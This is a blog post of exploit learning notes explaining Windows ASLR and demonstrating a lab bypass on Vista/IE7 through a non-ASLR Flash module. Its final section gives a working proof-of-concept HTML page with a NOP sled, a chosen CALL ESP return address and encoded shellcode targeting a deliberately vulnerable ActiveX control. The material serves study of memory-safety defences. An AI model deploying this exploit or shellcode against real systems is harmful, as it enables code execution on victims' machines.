<!doctype html><html lang=en dir=ltr><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="introduction to ASLR technology and simple attack ideas"><title>Exploit learning notes 017 ASLR Introduction</title><link rel=canonical href=https://blog.moeomu.com/posts/exploit-learning-notes-017-aslr-introduction/><link rel=stylesheet href=/scss/style.min.abbd69b2908fdfcd5179898beaafd374514a86538d81639ddd2c58c06ae54e40.css><meta property="og:title" content="Exploit learning notes 017 ASLR Introduction"><meta property="og:description" content="introduction to ASLR technology and simple attack ideas"><meta property="og:url" content="https://blog.moeomu.com/posts/exploit-learning-notes-017-aslr-introduction/"><meta property="og:site_name" content="Misaka's Secrect Garden"><meta property="og:type" content="article"><meta property="article:section" content="Post"><meta property="article:tag" content="Windows"><meta property="article:tag" content="ASLR"><meta property="article:published_time" content="2020-11-24T21:12:00+08:00"><meta property="article:modified_time" content="2020-11-24T21:12:00+08:00"><meta name=twitter:title content="Exploit learning notes 017 ASLR Introduction"><meta name=twitter:description content="introduction to ASLR technology and simple attack ideas"><script async src=https://umami.moeomu.com/Prototype data-website-id=da63d88b-4c19-4ee6-93cc-e12bd941eb81></script></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label="Toggle Menu">
<span class=hamburger-box><span class=hamburger-inner></span></span></button><header><figure class=site-avatar><a href=/><img src=/img/avatar_hu5c4b01d6d06a4818a5284ca6e51e5ac9_24136_300x0_resize_q75_box.jpg width=300 height=300 class=site-logo loading=lazy alt=Avatar></a>
<span class=emoji>üç•</span></figure><div class=site-meta><h1 class=site-name><a href=/>Misaka's Secrect Garden</a></h1><h2 class=site-description>In the gardens embrace, a celestial sprite dances.</h2></div></header><ol class=social-menu><li><a href=https://github.com/Misakaou target=_blank title=GitHub rel=me><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg></a></li><li><a href=https://twitter.com target=_blank title=Twitter rel=me><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M22 4.01c-1 .49-1.98.689-3 .99-1.121-1.265-2.783-1.335-4.38-.737S11.977 6.323 12 8v1c-3.245.083-6.135-1.395-8-4 0 0-4.182 7.433 4 11-1.872 1.247-3.739 2.088-6 2 3.308 1.803 6.913 2.423 10.034 1.517 3.58-1.04 6.522-3.723 7.651-7.742a13.84 13.84.0 00.497-3.753C20.18 7.773 21.692 5.25 22 4.009z"/></svg></a></li></ol><ol class=menu id=main-menu><li><a href=/><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="5 12 3 12 12 3 21 12 19 12"/><path d="M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7"/><path d="M9 21v-6a2 2 0 012-2h2a2 2 0 012 2v6"/></svg><span>Home</span></a></li><li><a href=/archives/><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg><span>Archives</span></a></li><li><a href=/search/><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg><span>Search</span></a></li><li><a href=/links/><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M10 14a3.5 3.5.0 005 0l4-4a3.5 3.5.0 00-5-5l-.5.5"/><path d="M14 10a3.5 3.5.0 00-5 0l-4 4a3.5 3.5.0 005 5l.5-.5"/></svg><span>Links</span></a></li><li><a href=/comment/><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-messages" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M21 14l-3-3h-7a1 1 0 01-1-1V4a1 1 0 011-1h9a1 1 0 011 1v10"/><path d="M14 15v2a1 1 0 01-1 1H6l-3 3V11a1 1 0 011-1h2"/></svg><span>Comment</span></a></li><li><a href=/about/><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="7" r="4"/><path d="M6 21v-2a4 4 0 014-4h4a4 4 0 014 4v2"/></svg><span>About</span></a></li><div class=menu-bottom-section><li id=i18n-switch><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-language" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M4 5h7"/><path d="M9 3v2c0 4.418-2.239 8-5 8"/><path d="M5 9c-.003 2.144 2.952 3.908 6.7 4"/><path d="M12 20l4-9 4 9"/><path d="M19.1 18h-6.2"/></svg><select name=language onchange="window.location.href=this.selectedOptions[0].value"><option value=https://blog.moeomu.com/ selected>English</option><option value=https://blog.moeomu.com/zh-cn/>‰∏≠Êñá</option></select></li><li id=dark-mode-toggle><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="8" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg><span>Dark Mode</span></li></div></ol></aside><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title">Table of contents</h2><div class=widget--toc><nav id=TableOfContents><ol><li><a href=#introduction-to-aslr-techniques>Introduction to ASLR techniques</a><ol><li><a href=#image-randomization>Image randomization</a></li><li><a href=#stack-randomization>Stack randomization</a></li><li><a href=#randomization-of-peb-and-teb>Randomization of PEB and TEB</a></li><li><a href=#defects-of-aslr>Defects of ASLR</a></li></ol></li><li><a href=#attack-the-module-without-aslr-enabled>Attack the module without ASLR enabled</a><ol><li><a href=#preparation>Preparation</a></li><li><a href=#steps>Steps</a></li></ol></li></ol></nav></div></section></aside><main class="main full-width"><article class=main-article><header class=article-header><div class=article-details><header class=article-category><a href=/categories/exploit/>Exploit</a></header><div class=article-title-wrapper><h2 class=article-title><a href=/posts/exploit-learning-notes-017-aslr-introduction/>Exploit learning notes 017 ASLR Introduction</a></h2><h3 class=article-subtitle>introduction to ASLR technology and simple attack ideas</h3></div><footer class=article-time><div><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg><time class=article-time--published>Nov 24, 2020</time></div><div><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg><time class=article-time--reading>6 minute read</time></div></footer><footer class=article-translations><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-language" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M4 5h7"/><path d="M9 3v2c0 4.418-2.239 8-5 8"/><path d="M5 9c-.003 2.144 2.952 3.908 6.7 4"/><path d="M12 20l4-9 4 9"/><path d="M19.1 18h-6.2"/></svg><div><a href=https://blog.moeomu.com/zh-cn/posts/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-017-aslr%E7%AE%80%E4%BB%8B/ class=link>‰∏≠Êñá</a></div></footer></div></header><section class=article-content><p>Source: <a class=link href=/posts/exploit-learning-notes-017-aslr-introduction/>Moeomu&rsquo;s blog</a></p><h2 id=introduction-to-aslr-techniques>Introduction to ASLR techniques</h2><blockquote><p>Throughout, all of the previously described vulnerability exploitation methods share a common feature: they all require the identification of a clear jump address. Whether it is a generic springboard instruction such as JMP ESP or the various instructions used by Ret2Libc, we need to determine the entry point of this instruction first. As the saying goes, Microsoft&rsquo;s ASLR (Address Space Layout Randomization) technology is a protection mechanism that interferes with shellcode positioning by no longer using a fixed base address to load the program</p><p>In fact, the concept of ASLR has been introduced in the Windows XP era, but the ASLR function on XP is very limited, only a simple randomization of PEB and TEB, but no randomization of the module load base address, until Windows Vista appeared, ASLR really began to work!</p><p>Similar to SafeSEH, ASLR implementation requires both program support and OS support, where program support is not required.</p></blockquote><ul><li>Microsoft has added the <code>/dynamicbase</code> linking option since Visual Studio 2005 SP1 to help us with this task. We just need to enable the <code>/ddynmicbase</code> linking option when we compile the program, and the compiled program will support ASLR</li></ul><h3 id=image-randomization>Image randomization</h3><ul><li>Image randomization is the process of randomizing the virtual address of the PE file loaded when it is mapped to memory, this address is determined at system startup and will change after system reboot</li><li>Probably for compatibility reasons, Microsoft has set a switch for image randomization in the system, which users can set by setting the registry key <code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SessionM anager\MemoryManagement\ MoveImages</code> key to set the working mode of image randomization<ul><li>When set to <code>0</code>, image randomization is disabled</li><li>When set to <code>-1</code>, randomizable images are forced to be processed with or without the <code>IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE</code> flag set</li><li>Normal mode of operation when set to other values, only images with the randomized processing flag are processed</li><li>If <code>MoveImages</code> does not exist in the registry, you can manually create a value with the name <code>MoveImages</code> and the type <code>DWORD</code> and set its value as needed</li></ul></li></ul><h3 id=stack-randomization>Stack randomization</h3><ul><li>This measure is to randomly select the base address of the stack when the program is running. The difference with image base randomization is that the base address of the stack is not determined when the system is started, but when the program is opened, which means that the base address of the stack is different for any two runs of the same program, and thus the location of each variable in memory is not determined.</li><li>Compile the following program in VS2008, run it twice on XP and Vista, and get the following result</li></ul><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-cpp data-lang=cpp><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kt>char</span><span class=o>*</span> <span class=n>heap</span> <span class=o>=</span> <span class=p>(</span><span class=kt>char</span> <span class=o>*</span><span class=p>)</span><span class=n>malloc</span><span class=p>(</span><span class=mi>100</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=kt>char</span> <span class=n>stack</span><span class=p>[</span><span class=mi>100</span><span class=p>];</span>
</span></span><span class=line><span class=cl>  <span class=n>printf</span><span class=p>(</span><span class=s>&#34;Address of heap:%#0.4x</span><span class=se>\n</span><span class=s>Address of stack:%#0.4x&#34;</span><span class=p>,</span> <span class=n>heap</span><span class=p>,</span> <span class=n>stack</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>getchar</span><span class=p>();</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p><img src=/Windows%20Vista.png loading=lazy alt="Windows Vista">
<img src=/Windows%20XP.png loading=lazy alt="Windows XP"></p><ul><li>As you can see, the heap addresses are far apart on Vista, while they are identical on XP</li></ul><h3 id=randomization-of-peb-and-teb>Randomization of PEB and TEB</h3><ul><li>Getting the TEB and PEB of the current process is simple, the TEB is stored at <code>FS:0</code> and <code>FS:[0x18]</code> and the PEB is stored at the TEB offset <code>0x30</code>, you can get the TEB and PEB of the current process by the following code</li></ul><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-cpp data-lang=cpp><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kt>unsigned</span> <span class=kt>int</span> <span class=n>teb</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>unsigned</span> <span class=kt>int</span> <span class=n>peb</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kr>__asm</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>mov</span> <span class=n>eax</span><span class=p>,</span> <span class=nl>FS</span><span class=p>:[</span><span class=mh>0x18</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=n>mov</span> <span class=n>teb</span><span class=p>,</span> <span class=n>eax</span>
</span></span><span class=line><span class=cl>        <span class=n>mov</span> <span class=n>eax</span><span class=p>,</span> <span class=n>dword</span> <span class=n>ptr</span><span class=p>[</span><span class=n>eax</span><span class=o>+</span><span class=mh>0x30</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=n>mov</span> <span class=n>peb</span><span class=p>,</span> <span class=n>eax</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=n>printf</span><span class=p>(</span><span class=s>&#34;PEB:%#x</span><span class=se>\n</span><span class=s>TEB:%#x&#34;</span><span class=p>,</span> <span class=n>peb</span><span class=p>,</span> <span class=n>teb</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>getchar</span><span class=p>();</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><ul><li>Test run on Vista, the results are as shown</li></ul><p><img src=/posts/exploit-learning-notes-017-aslr-introduction/PEB-TEB-random-Vista.png width=445 height=223 srcset="/posts/exploit-learning-notes-017-aslr-introduction/PEB-TEB-random-Vista_hu00ba9e2f2bf089356c2e504e0ca73284_72259_480x0_resize_box_3.png 480w, /posts/exploit-learning-notes-017-aslr-introduction/PEB-TEB-random-Vista_hu00ba9e2f2bf089356c2e504e0ca73284_72259_1024x0_resize_box_3.png 1024w" loading=lazy alt=PEB-TEB-random-Vista class=gallery-image data-flex-grow=199 data-flex-basis=478px></p><ul><li>As you can see, the result is very poor, the PEB address is only randomized by one byte, and it is still very regular, the TEB is basically unchanged</li></ul><h3 id=defects-of-aslr>Defects of ASLR</h3><ul><li>It is not difficult to see that when ASLR randomizes the image, although the module load base address has changed, but the entry point of each module&rsquo;s lower two bytes will not change, for example: the original base address: <code>0x00401234</code>, after randomization the base address becomes: <code>0x67291234</code>, so you can use this to attack it</li></ul><h2 id=attack-the-module-without-aslr-enabled>Attack the module without ASLR enabled</h2><h3 id=preparation>Preparation</h3><blockquote><p>Experimental environment: Windows Vista SP0, IE7, Adobe Flash Player 9.0.124</p></blockquote><ul><li>Although the book requires the use of version 9.0.262, but I really can not find it, so I will use 9.0.124 instead, <a class=link href=https://pan.moeomu.com/Tutorial/0Day%e5%ae%89%e5%85%a8-%e8%b5%84%e6%96%99/flashplayer9r124_winax.exe target=_blank rel=noopener>click here to download</a></li><li>The vulnerable OCX control has already been compiled in the previous experiment, so use that one, <a class=link href=https://pan.moeomu.com/Tutorial/0Day%e5%ae%89%e5%85%a8-%e8%b5%84%e6%96%99/VulnerAX_SEH/VulnerAX_SEH.ocx target=_blank rel=noopener>click here to download</a>, this control ctrl class object id: <code>ACA3927C-6BD1-4B4E-8697-72481279AAEC</code></li></ul><h3 id=steps>Steps</h3><ul><li>Reboot the system to see the ASLR module enabled</li></ul><p><img src=/ASLR%20not%20enabled%20status.png loading=lazy alt="ASLR not enabled status"></p><ul><li>Experimental control is not enabled GS</li><li>Load POC page and Flash9k.ocx via IE7</li><li>There is a stack overflow vulnerability in the function test, which aims to overwrite the return address of the function</li><li>Because Flash9k.ocx is not ASLR enabled, the load base address is fixed, so you can search for a suitable springboard instruction inside to jump to shellcode</li><li>IE7&rsquo;s DEP is turned off, so the impact of DEP is not considered</li><li>Since the attack is achieved by overwriting the return address of the function, the best springboard instruction is JMP ESP</li><li><code>0x301D606B</code> is also <code>JMP ESP</code>, which will jump to the head of the string after execution, but the problem is that the four bytes of <code>6B 60 1D 30</code> constitute exactly one line of assembly instruction <code>imul esp,dword ptr ds:[eax+0x1D],0x30</code>, which will multiply the last two operands and subsequently put them into the first operand So it needs to keep the value of <code>[eax+0x1D]</code> correct, and currently eax is not pointing to a valid address, so it needs to fix eax</li><li>Unfortunately, there is no suitable instruction for fixing eax, so change the address</li><li><code>0x303911D3</code> is also <code>JMP ESP</code>, but the assembly code it consists of will read both EC and EAX, so both registers need to be repaired, not feasible, change instruction</li><li><code>JMP ESP</code> is not available, use <code>JMP ESI</code> instead, address <code>0x3000DCD2</code> contains 0, directly excluded, address <code>0x302420C3</code> the last byte is retn, can not be used, excluded, address <code>0x3028EE6E</code> assembly code will directly cause an exception, excluded, this instruction is also no longer suitable, so look for other suitable instruction</li><li>The <code>CALL ESP</code> at address <code>0x300942F2</code> seems to be suitable, it will also increase the esp by 8 bytes to avoid the garbage data.</li><li>Here is the shellcode after the change</li></ul><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>object</span> <span class=na>classid</span><span class=o>=</span><span class=s>&#34;clsid:D27CDB6E-AE6D-11cf-96B8-444553540000&#34;</span> <span class=na>codebase</span><span class=o>=</span><span class=s>&#34;http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=9,0,28,0&#34;</span> <span class=na>width</span><span class=o>=</span><span class=s>&#34;160&#34;</span> <span class=na>height</span><span class=o>=</span><span class=s>&#34;260&#34;</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>param</span> <span class=na>name</span><span class=o>=</span><span class=s>&#34;movie&#34;</span> <span class=na>value</span><span class=o>=</span><span class=s>&#34;1.swf&#34;</span> <span class=p>/&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>param</span> <span class=na>name</span><span class=o>=</span><span class=s>&#34;quality&#34;</span> <span class=na>value</span><span class=o>=</span><span class=s>&#34;high&#34;</span> <span class=p>/&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>embed</span> <span class=na>src</span><span class=o>=</span><span class=s>&#34;1.swf&#34;</span> <span class=na>quality</span><span class=o>=</span><span class=s>&#34;high&#34;</span> <span class=na>pluginspage</span><span class=o>=</span><span class=s>&#34;http://www.adobe.com/shockwave/download/download.cgi?P1_Prod_Version=ShockwaveFlash&#34;</span> <span class=na>type</span><span class=o>=</span><span class=s>&#34;application/x-shockwave-flash&#34;</span> <span class=na>width</span><span class=o>=</span><span class=s>&#34;160&#34;</span> <span class=na>height</span><span class=o>=</span><span class=s>&#34;260&#34;</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>embed</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>object</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>object</span> <span class=na>classid</span><span class=o>=</span><span class=s>&#34;clsid:ACA3927C-6BD1-4B4E-8697-72481279AAEC&#34;</span> <span class=na>id</span><span class=o>=</span><span class=s>&#34;test&#34;</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>object</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>script</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>	<span class=kd>var</span> <span class=nx>s</span> <span class=o>=</span> <span class=s2>&#34;\u9090&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=k>while</span> <span class=p>(</span><span class=nx>s</span><span class=p>.</span><span class=nx>length</span> <span class=o>&lt;</span> <span class=mi>54</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=nx>s</span> <span class=o>+=</span> <span class=s2>&#34;\u9090&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=nx>s</span> <span class=o>+=</span> <span class=s2>&#34;\u42F2\u3009&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=nx>s</span> <span class=o>+=</span> <span class=s2>&#34;\u9090\u9090&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=nx>s</span> <span class=o>+=</span> <span class=s2>&#34;\u68fc\u0a6a\u1e38\u6368\ud189\u684f\u7432\u0c91\uf48b\u7e8d\u33f4\ub7db\u2b04\u66e3\u33bb\u5332\u7568\u6573\u5472\ud233\u8b64\u305a\u4b8b\u8b0c\u1c49\u098b\u698b\uad08\u6a3d\u380a\u751e\u9505\u57ff\u95f8\u8b60\u3c45\u4c8b\u7805\ucd03\u598b\u0320\u33dd\u47ff\u348b\u03bb\u99f5\ube0f\u3a06\u74c4\uc108\u07ca\ud003\ueb46\u3bf1\u2454\u751c\u8be4\u2459\udd03\u8b66\u7b3c\u598b\u031c\u03dd\ubb2c\u5f95\u57ab\u3d61\u0a6a\u1e38\ua975\udb33\u6853\u616B\u6F6F\u4D68\u7369\u8B61\u53c4\u5050\uff53\ufc57\uff53\uf857&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=nx>test</span><span class=p>.</span><span class=nx>test</span><span class=p>(</span><span class=nx>s</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>script</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>body</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>html</span><span class=p>&gt;</span>
</span></span></code></pre></td></tr></table></div></div><ul><li>As shown in the picture, reboot the system, the shellcode runs normally, which means the attack on ASLR is successful</li></ul><p><img src=/shellcode%20run%20successfully.png loading=lazy alt="shellcode run successfully"></p></section><footer class=article-footer><section class=article-tags><a href=/tags/windows/>Windows</a>
<a href=/tags/aslr/>ASLR</a></section><section class=article-copyright><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg><span>Licensed under CC BY-NC-SA 4.0</span></section></footer></article><aside class=related-content--wrapper><h2 class=section-title>Related content</h2><div class=related-content><div class="flex article-list--tile"><article><a href=/posts/exploit-learning-notes-018-using-partial-overlay-location/><div class=article-details><h2 class=article-title>Exploit learning notes 018 using partial overlay location</h2></div></a></article><article><a href=/posts/exploit-learning-notes-021-protected-heap/><div class=article-details><h2 class=article-title>Exploit learning notes 021 Protected HEAP</h2></div></a></article><article><a href=/posts/exploit-learning-notes-020-sehop-introduction/><div class=article-details><h2 class=article-title>Exploit learning notes 020 SEHOP introduction</h2></div></a></article><article><a href=/posts/exploit-learning-notes-019-using-heapspray-attack-aslr/><div class=article-details><h2 class=article-title>Exploit learning notes 019 Using HeapSpray Attack ASLR</h2></div></a></article><article><a href=/posts/exploit-learning-notes-016-executable-memory-and-.net-attack-dep/><div class=article-details><h2 class=article-title>Exploit learning notes 016 executable memory and .net attack DEP</h2></div></a></article></div></div></aside><script src=https://giscus.app/client.js data-repo=Moeomu/blog data-repo-id=R_kgDOHHJl4A data-category=Announcements data-category-id=DIC_kwDOHHJl4M4CR7uM data-mapping=pathname data-strict=0 data-reactions-enabled=1 data-emit-metadata=0 data-input-position=top data-theme=light data-lang=en crossorigin=anonymous async></script>
<script>function setGiscusTheme(e){let t=document.querySelector("iframe.giscus-frame");t&&t.contentWindow.postMessage({giscus:{setConfig:{theme:e}}},"https://giscus.app")}(function(){addEventListener("message",t=>{if(event.origin!=="https://giscus.app")return;e()}),window.addEventListener("onColorSchemeChange",e);function e(){setGiscusTheme(document.documentElement.dataset.scheme==="light"?"light":"dark_dimmed")}})()</script><footer class=site-footer><section class=copyright>&copy;
2020 -
